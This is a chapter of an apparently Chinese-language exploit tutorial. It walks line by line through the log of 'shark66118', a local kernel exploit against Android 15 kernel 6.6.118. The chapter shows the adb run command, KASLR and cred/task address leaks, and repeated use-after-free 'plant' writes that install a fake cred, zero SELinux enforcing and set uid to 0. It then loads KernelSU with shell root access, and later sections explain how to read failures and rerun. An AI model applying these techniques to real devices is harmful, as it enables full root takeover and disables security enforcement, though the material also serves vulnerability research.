# 10 · 完整成功链逐阶段解读

**中文** · [English](en/10-breakthrough.md)

> 这一章逐行解释成功日志，让你知道每一步在做什么、为什么需要它。

---

## 一、完整日志

```console
$ adb shell "cd /data/local/tmp && \
    PYB110_KSUD=/data/local/tmp/ksud33 \
    PYB110_MANAGER_PKG=me.weishu.kernelsu \
    PYB110_KMI=android15-6.6 \
    ./shark66118 --auto"
```

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
[+] pid=18271 cpu=2
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=15 best=0xffffff7fc0000000 count=202
[cred] attempt=0 child=18272 R=0xffffff80c117ad80 site_low=0x164064 recs=1 task=0xffffff804d6e4b00 task_recs=1
[+] child=18272 cred=0xffffff80c117ad80 target=0xffffff80c117ad88
[+] stage fake_cred target=0xffffff804d6e5320 mode=fake attempt=1
[+] plant1 base=0xffffff7fc0000000 slabs=67 pfns=66 recs=2048 kept=2048
[+] plant1 fake cred off=0x288 blob=0x1f00 sec=0xffffff801a49df00
[slab] pre-exec active=4681 total=4681
[+] plant1 V=0xffffff801a49c210 A=0xffffff801a49c288 pfn=0x5a49c slab=0x5a49c slide=0x2b45280000 recs=2048 slab_own=31/32 base=0xffffff7fc0000000
[+] plant1 target=18273 etid=18282 zombie code=2 status=9
[dbg] plant1 spray round=1 at free (no churn)
[+] plant1 free_seen=1 burst hit=1 after 48ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=fake target=0xffffff804d6e5320
[+] fake cred A=0xffffff801a49c288 selinux_state=0xffffffebc75ea2e0
[+] stage selinux target=0xffffffebc75ea2d9 mode=zero attempt=1
[+] plant1 base=0xffffff7fc0000000 slabs=67 pfns=59 recs=2048 kept=2048
[slab] pre-exec active=4681 total=4681
[+] plant1 V=0xffffff80de1d8840 A=0xffffff80de1d88b8 pfn=0x11e1d8 slab=0x11e1d8 slide=0x2b45280000 recs=2048 slab_own=31/32 base=0xffffff7fc0000000
[+] plant1 target=18305 etid=18310 zombie code=2 status=9
[dbg] plant1 spray round=1 at free (no churn)
[+] plant1 free_seen=1 burst hit=1 after 132ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffffebc75ea2d9
[ksu] panic_on_warn=0
[+] stage fake_uid target=0xffffff801a49c290 mode=zero attempt=1
[+] plant1 base=0xffffff7fc0000000 slabs=67 pfns=59 recs=2048 kept=2048
[slab] pre-exec active=7254 total=7254
[+] plant1 V=0xffffff8126db8738 A=0xffffff8126db87b0 pfn=0x166db8 slab=0x166db8 slide=0x2b45280000 recs=2048 slab_own=31/32 base=0xffffff7fc0000000
[+] plant1 target=18326 etid=18333 zombie code=2 status=9
[dbg] plant1 spray round=1 at free (no churn)
[+] plant1 free_seen=1 burst hit=1 after 103ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffff801a49c290
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 setuid(0)=0 errno=0 resuid=0/0/0 wake=1/0
[fake] child uid=0 euid=0; one-shot late-load then park
PLANT_CRED_OK child=19711
PARKED=1
[!] fake cred page held; child parked after late-load -- parking without reap (zombie held)
LATE_LOAD_CMD='/data/local/tmp/ksud33' late-load --kmi android15-6.6 --allow-shell --package-name me.weishu.kernelsu 2>&1; echo LATE_LOAD_RC=$?
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

---

## 二、逐行解读

### 2.1 自检阶段

```
PROBE_KERNEL=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROFILE_66118=6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k
PROBE_TRACE=yes
PROBE_OK
```

- **版本精确匹配**：只有完全相同的内核串才会选中 profile
- **`PROBE_TRACE=yes`**：tracefs 可读
- **`PROBE_OK`**：三件事都过了（timer 事件 / slide / 线性映射）

**如果这里失败，后面不用试。**

### 2.2 事件 ID 发现

```
[+] pid=18271 cpu=2
[ids] page_alloc=275 page_free=273 pairs=1029 votes=1026
```

`events/*/id` 文件是 0640（root-only 元数据），所以**不能直接读**。
Shark 的做法是：分配/释放一批匿名页，然后从 raw 记录里
**按 pfn 配对** alloc 和 free 事件，从而推断出事件 id。

- `pairs=1029`：找到 1029 对 (alloc, free)
- `votes=1026`：确认的事件 id 组合

**这是一个很聪明的自发现机制 —— 不依赖任何硬编码 id。**

### 2.3 KASLR 与线性映射

```
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=15 best=0xffffff7fc0000000 count=202
```

- **`timers=512`**：成功从 trace 里抓到 512 个 timer 分配
- **`low_adj=0x80000`**：★ 我们的修复生效，识别出 slide 的 mod-2MiB 分量
- **`best=0xffffff7fc0000000`**：线性映射基址（`page_offset`），`count=202` 票

**注意：`best` 不是标准的 `0xffffff7f80000000`。这颗 SoC 的 DRAM 起始 PFN 不同。**

### 2.4 泄漏 cred 和 task

```
[cred] attempt=0 child=18272 R=0xffffff80c117ad80 site_low=0x164064 recs=1 task=0xffffff804d6e4b00 task_recs=1
[+] child=18272 cred=0xffffff80c117ad80 target=0xffffff80c117ad88
```

- **`R=0xffffff80c117ad80`**：子进程 cred 的真实内核地址
- **`site_low=0x164064`**：`prepare_creds+0x24` 的运行时低21位（本该是 `0xe4064` + `0x80000`）
- **`task=0xffffff804d6e4b00`**：子进程 task_struct 的真实地址
- **`target=cred+8`**：`uid`/`gid` 字段

**⚠️ 在修复之前，这里会是 `task=0 task_recs=0`。**

### 2.5 阶段一：fake_cred

```
[+] stage fake_cred target=0xffffff804d6e5320 mode=fake attempt=1
```

**`target = task + 0x820`** —— `task_struct.cred` 字段。

```
[+] plant1 fake cred off=0x288 blob=0x1f00 sec=0xffffff801a49df00
```

- `off=0x288`：假 cred 在页内的偏移
- `blob=0x1f00`：SELinux blob 的大小
- `sec=...`：SELinux blob 的地址

```
[+] plant1 V=0xffffff801a49c210 A=0xffffff801a49c288 pfn=0x5a49c slab=0x5a49c ...
```

- `V`：受害 k_itimer 的地址
- `A`：node 地址（V + 0x78）
- `pfn/slab`：对应的物理页号

```
[+] plant1 free_seen=1 burst hit=1 after 48ms      ← ★ EXACT HIT
[+] plant1 reaped status=0x9                        ← 这时候才 reap
[+] plant1 write mode=fake target=0xffffff804d6e5320
```

**关键：`burst hit=1` 才 reap。这就是与盲 reap 的区别。**

### 2.6 阶段二：selinux

```
[+] fake cred A=0xffffff801a49c288 selinux_state=0xffffffebc75ea2e0
[+] stage selinux target=0xffffffebc75ea2d9 mode=zero attempt=1
```

**`selinux_state` 的运行时地址 = 链接地址 `0x8236a2e0` + slide。**

注意 `target = selinux_state - 7`：

```
selinux_state + 0  ← enforcing 字段的某一位
```

这是因为 `selinux_state` 里 `enforcing` 是位域，需要精确到字节/位偏移。

```
[+] plant1 free_seen=1 burst hit=1 after 132ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffffebc75ea2d9
```

**这一刻 `getenforce` 变成 Permissive（现场实测确认过）。**

### 2.7 阶段三：fake_uid

```
[ksu] panic_on_warn=0                                    ← 关掉 panic_on_warn，降低崩溃风险
[+] stage fake_uid target=0xffffff801a49c290 mode=zero attempt=1
```

**`target = 假 cred + 0x08` = `uid`/`gid` 字段**（假 cred 在 `A=0x288`，+8 = `0x290`）。

```
[+] plant1 free_seen=1 burst hit=1 after 103ms
[+] plant1 reaped status=0x9
[+] plant1 write mode=zero target=0xffffff801a49c290
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 setuid(0)=0 errno=0 resuid=0/0/0 wake=1/0
```

**`resuid=0/0/0` —— real / effective / saved 全是 0。**

对比默认模式（只能拿到空能力集）：

```
[child] woke uid=0 euid=2000          ← 默认模式
resuid=0/0/2000

[child] woke uid=0 euid=0             ← fake 模式 ★
resuid=0/0/0
```

### 2.8 late-load

```
[fake] child uid=0 euid=0; one-shot late-load then park
PLANT_CRED_OK child=19711
PARKED=1
[!] fake cred page held; child parked after late-load -- parking without reap (zombie held)
LATE_LOAD_CMD='/data/local/tmp/ksud33' late-load --kmi android15-6.6 --allow-shell --package-name me.weishu.kernelsu
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

- **子进程 exec `ksud late-load`** → 加载 KernelSU 内核模块
- **`--allow-shell`**：允许 adb shell 使用 `su`
- **`--kmi android15-6.6`**：目标内核模块接口
- **父进程 `PARKED=1`**：一直保持假 cred 那一页不被释放

**`PARKED` 是必要的 —— 如果父进程退出，那一页被释放，
而内核里还有 task 指向它 → 迟早崩。**

### 2.9 验证

```console
$ adb shell grep kernelsu /proc/modules
kernelsu 180224 4 - Live 0x0000000000000000 (O)

$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb shell su -c 'grep Cap /proc/self/status'
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

---

## 三、失败日志怎么读

### 3.1 卡在 calibration

```
[calib] timers=0
[base] made=512 timers=0 pages=15 best=0 count=0
[-] base calibration failed
```

**⇒ KASLR 低21位问题（见 09 章）。检查 `low_adj` 有没有被识别。**

### 3.2 卡在 cred/task 泄漏

```
[cred] ... recs=1 task=0 task_recs=0 failed
[-] cred leak failed
```

**⇒ 同样是低21位问题，或者 task 分配事件没被捕获。**

### 3.3 卡在某阶段页回收

```
[+] plant1 free_seen=1 burst hit=0 after 3093ms
[-] plant1 burst missed; holding zombie
[-] stage fake_uid failed
FAIL=fake-uid REASON=fake-uid T=14487ms
FAIL_EXIT=fake-uid holder=t61269-hold zombies=1
[!] failed plant zombies held -- parking without reap (zombie held)
```

**⇒ 纯概率问题。`holding zombie` 是安全行为，直接重跑即可。**

### 3.4 卡在 late-load

```
LATE_LOAD_SKIP=env-missing ksud=(null) pkg=me.weishu.kernelsu
```

**⇒ 没设 `PYB110_KSUD` 环境变量。**

```
LATE_LOAD_RC=非0
```

**⇒ ksud 版本不匹配 / 模块加载失败。检查 KernelSU 管理器版本。**

---

## 四、各阶段的独立性

**重要：三个阶段是各自独立的一次 plant，每次都要单独获得 `burst hit=1`。**

```
fake_cred  需要一次 hit
selinux    需要一次 hit
fake_uid   需要一次 hit
```

**所以整体成功率 ≈ 单次成功率³。**

如果单次是 95%，整体是 86%。
如果单次是 90%，整体是 73%。

**实测我们大约 2/3 一次成功 —— 和这个估算吻合。**

**⇒ 失败是正常的，重跑就行。**
